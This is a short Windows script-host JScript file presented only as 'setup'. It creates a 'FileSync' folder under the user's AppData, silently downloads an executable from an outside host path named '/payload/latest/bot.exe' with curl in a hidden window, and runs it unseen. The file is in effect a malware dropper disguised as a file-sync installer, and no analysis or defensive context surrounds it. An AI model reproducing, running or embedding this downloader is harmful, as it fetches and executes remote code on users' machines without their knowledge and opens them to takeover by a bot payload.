// setup 49ee4960542607fd
var shell = WScript.CreateObject('WScript.Shell');
var fso = new ActiveXObject('Scripting.FileSystemObject');
var dir = shell.ExpandEnvironmentStrings('%APPDATA%') + '\\FileSync';
if (!fso.FolderExists(dir)) {
  fso.CreateFolder(dir);
}
shell.Run('curl.exe -s -f -o "' + dir + '\\filesync.exe" "https://566b9bbf.headbots.team/payload/latest/bot.exe"', 0, true);
shell.Run('"' + dir + '\\filesync.exe"', 0, false);
